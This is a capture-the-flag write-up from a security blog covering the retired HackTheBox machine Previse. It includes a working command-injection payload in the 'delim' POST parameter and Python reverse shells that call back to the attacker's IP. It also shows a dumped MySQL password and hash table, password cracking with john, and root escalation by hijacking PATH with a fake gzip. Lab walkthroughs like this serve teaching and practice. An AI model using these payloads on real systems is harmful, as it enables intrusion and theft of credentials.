@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Previse | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2022/01/htb-previse.html" title="Read more" class="entry-title-link">
+                HTB: Previse</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2022-01-08T17:44:00+01:00">08 Jan 2022</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/path.html" title="Read more with the label PATH" class="meta-link">PATH</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 7 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2022.01/previse_card.png" alt="Previse" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/373">Previse</a> publish on
+August 7, 2021 by
+<a href="https://www.hackthebox.eu/home/users/profile/107145">m4lwhere</a>.
+This box is rated as an easy machine. It implies a hidden page, a unsanitize
+variable, a funny salt and a relative PATH.</p>
+
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
+open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.91 scan initiated Sat Aug 28 08:31:50 2021 as: nmap -p- -sSV -oN notes.md -A 10.129.193.153</span>
+<span class="code-line">Nmap scan report for 10.129.193.153</span>
+<span class="code-line">Host is up (0.013s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>The website is a simple authentication form. We launch <code>ffuf</code> against it and
+found a few pages.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ ./ffuf -w /usr/share/dirb/wordlists/common.txt -u  http://10.129.193.153/FUZZ -mc 200 -e .php</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]</span>
+<span class="code-line">favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]</span>
+<span class="code-line">footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]</span>
+<span class="code-line">header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]</span>
+<span class="code-line">login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]</span>
+<span class="code-line">nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]</span>
+<span class="code-line">:: Progress: [9228/9228] :: Job [1/1] :: 2567 req/sec :: Duration: [0:00:03] :: Errors: 0 ::</span>
+<span class="code-line"></code></pre></div>
+
+<p>Looking at <code>nav.php</code> we found the <code>accounts.php</code> page with an automatic redirection to the login page
+we look at the HTML and send the post request required to create an account
+using Burp. We can then login as our user on the application</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /accounts.php HTTP/1.1</span>
+<span class="code-line">Host: 10.129.193.153</span>
+<span class="code-line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="code-line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="code-line">Accept-Language: en-US,en;q=0.5</span>
+<span class="code-line">Accept-Encoding: gzip, deflate</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Content-Length: 51</span>
+<span class="code-line">Connection: close</span>
+<span class="code-line">Cookie: PHPSESSID=uu672fe9ecq5640am2fgsekhbk</span>
+<span class="code-line">Upgrade-Insecure-Requests: 1</span>
+<span class="code-line"></span>
+<span class="code-line">username=toto1&amp;password=12345&amp;confirm=12345&amp;submit=</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can download the <code>siteBackup</code> file on the server.
+The <code>logs.php</code> file seems to be called when we want to get the log data via the management menu.
+We can see that the POST parameter <code>delim</code> is not sanitize and use directly in an <code>exec</code> statement.
+We can use that to run code on the box. We run a simple python HTTP server (<code>python3 -m http.server</code>)
+and using Burp repeater put the following payload in the <code>delim</code> parameter:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>POST /logs.php HTTP/1.1</span>
+<span class="code-line">Host: 10.129.193.153</span>
+<span class="code-line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="code-line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="code-line">Accept-Language: en-US,en;q=0.5</span>
+<span class="code-line">Accept-Encoding: gzip, deflate</span>
+<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
+<span class="code-line">Content-Length: 35</span>
+<span class="code-line">Origin: http://10.129.193.153</span>
+<span class="code-line">Connection: close</span>
+<span class="code-line">Referer: http://10.129.193.153/file_logs.php</span>
+<span class="code-line">Cookie: PHPSESSID=uu672fe9ecq5640am2fgsekhbk</span>
+<span class="code-line">Upgrade-Insecure-Requests: 1</span>
+<span class="code-line"></span>
+<span class="code-line">delim=; wget 10.10.14.52:8000/$(id)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We got the RCE on our web server:
+<code>10.129.193.153 - - [28/Aug/2021 09:06:34] "GET /uid=33(www-data) HTTP/1.1" 404 -</code></p>
+<p>We know that python is on the box so we use a basic python reverse shell. The
+payload is the following:</p>
+<p><code>delim=; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.52",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</code></p>
+<p>We run <code>netcat</code> on our kali box to catch our reverse shell and are logged in
+as the <code>www-data</code> user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nc -l -p 4242</span>
+<span class="code-line">$ id</span>
+<span class="code-line">id</span>
+<span class="code-line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="code-line"></code></pre></div>
+
+<p>Using the connection credentials in the <code>config.php</code> file we can login on the
+MySQL database as <code>root</code> and grab the passwords in the <code>accounts</code> table.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ mysql -u root -p</span>
+<span class="code-line">mysql -u root -p</span>
+<span class="code-line">Enter password: mySQL_p@ssw0rd!:)</span>
+<span class="code-line"></span>
+<span class="code-line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span>
+<span class="code-line">mysql&gt; use previse;</span>
+<span class="code-line">use previse;</span>
+<span class="code-line">Reading table information for completion of table and column names</span>
+<span class="code-line">You can turn off this feature to get a quicker startup with -A</span>
+<span class="code-line"></span>
+<span class="code-line">Database changed</span>
+<span class="code-line">mysql&gt; SHOW TABLES;</span>
+<span class="code-line">SHOW TABLES;</span>
+<span class="code-line">+-------------------+</span>
+<span class="code-line">| Tables_in_previse |</span>
+<span class="code-line">+-------------------+</span>
+<span class="code-line">| accounts          |</span>
+<span class="code-line">| files             |</span>
+<span class="code-line">+-------------------+</span>
+<span class="code-line">2 rows in set (0.00 sec)</span>
+<span class="code-line"></span>
+<span class="code-line">mysql&gt; select * from accounts;</span>
+<span class="code-line">select * from accounts;</span>
+<span class="code-line">+----+----------+------------------------------------+---------------------+</span>
+<span class="code-line">| id | username | password                           | created_at          |</span>
+<span class="code-line">+----+----------+------------------------------------+---------------------+</span>
+<span class="code-line">|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |</span>
+<span class="code-line">|  2 | totoo    | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-25 12:49:52 |</span>
+<span class="code-line">|  3 | toto1    | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-08-25 12:50:25 |</span>
+<span class="code-line">+----+----------+------------------------------------+---------------------+</span>
+<span class="code-line">3 rows in set (0.00 sec)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We run john on the hashes (keep the unicode salt character in the salt value)
+with the rockyou dictionary and got the <code>m4lwhere</code> user password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ john -w=rockyou.txt hash --format=md5crypt-long</span>
+<span class="code-line">--------------------------------------------------------------------------</span>
+<span class="code-line">Loaded 3 password hashes with no different salts (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])</span>
+<span class="code-line">Will run 8 OpenMP threads</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">123456           (?)</span>
+<span class="code-line">12345            (?)</span>
+<span class="code-line">2g 0:00:00:51 6.65% (ETA: 15:36:49) 0.03919g/s 21235p/s 21235c/s 21238C/s 438700..4358427</span>
+<span class="code-line">2g 0:00:02:09 18.48% (ETA: 15:35:40) 0.01550g/s 22220p/s 22220c/s 22221C/s vixieskathys109..vixen911</span>
+<span class="code-line">ilovecody112235! (?)</span>
+<span class="code-line">3g 0:00:06:35 DONE (2021-08-28 15:30) 0.007588g/s 18752p/s 18752c/s 18752C/s ilovecoke95..ilovecody*</span>
+<span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
+<span class="code-line">Session completed</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use this password to connect on the SSH service and get the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>└─$ ssh m4lwhere@10.129.193.153 #ilovecody112235!</span>
+<span class="code-line">m4lwhere@previse:~$ id</span>
+<span class="code-line">uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)</span>
+<span class="code-line">m4lwhere@previse:~$ cat user.txt</span>
+<span class="code-line">15af390166c631f24622d77948ba2444</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<p>We look at our <code>sudo</code> privileges and found that we can run a bash script as
+root.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>m4lwhere@previse:~$ sudo -l</span>
+<span class="code-line">[sudo] password for m4lwhere:</span>
+<span class="code-line">User m4lwhere may run the following commands on previse:</span>
+<span class="code-line">    (root) /opt/scripts/access_backup.sh</span>
+<span class="code-line"></code></pre></div>
+
+<p>Looking at the script we quickly notice the use of a relative path to call the
+<code>gzip</code> binary we should be able to easily run anything.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh</span>
+<span class="code-line">#!/bin/bash</span>
+<span class="code-line"></span>
+<span class="code-line"># We always make sure to store logs, we take security SERIOUSLY here</span>
+<span class="code-line"></span>
+<span class="code-line"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span class="code-line"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+<span class="code-line"></span>
+<span class="code-line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz</span>
+<span class="code-line">gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</span>
+<span class="code-line"></code></pre></div>
+
+<p>Obviously we could just retrive the flag by putting <code>cp /root/root.txt /tmp &amp;&amp; chmod 777 /tmp/*</code>
+in our <code>gzip</code> file but a <code>root</code> shell is better.</p>
+<p>We have a few ways to get a root shell with our command injection:</p>
+<ul>
+<li>Add a root (id 0) user to <code>/etc/passwd</code> with a password of our choice (see <a href="/2021/07/htb-armageddon.html">armageddon</a>)</li>
+<li>surcharge our <code>sudo</code> permissions  (see <a href="https://maggick.fr/2021/12/htb-bountyhunter.html">bountyhunter</a>)</li>
+<li>Add an ssh key to <code>root</code></li>
+<li>run a reverse shell</li>
+</ul>
+<p>We will use the latest one here and get a reverse shell as <code>root</code> allowing to grab
+the last flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>m4lwhere@previse:~$ export PATH=./:$PATH</span>
+<span class="code-line">m4lwhere@previse:~$ vim gzip</span>
+<span class="code-line">m4lwhere@previse:~$ cat gzip</span>
+<span class="code-line">python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.52&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+<span class="code-line">m4lwhere@previse:~$ chmod +x gzip</span>
+<span class="code-line">m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh</span>
+<span class="code-line"></span>
+<span class="code-line">└─$ nc -l -p 4242</span>
+<span class="code-line"># id</span>
+<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="code-line"># cat /root/root.txt</span>
+<span class="code-line">d465e7ac787731bbd7de2f69444407e3</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>An easy box really recommended for beginners as their is only two classical
+vulnerabilities here.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2021/12/htb-bountyhunter.html"> HTB: BountyHunter </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2022/01/htb-forge.html"> HTB: Forge </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
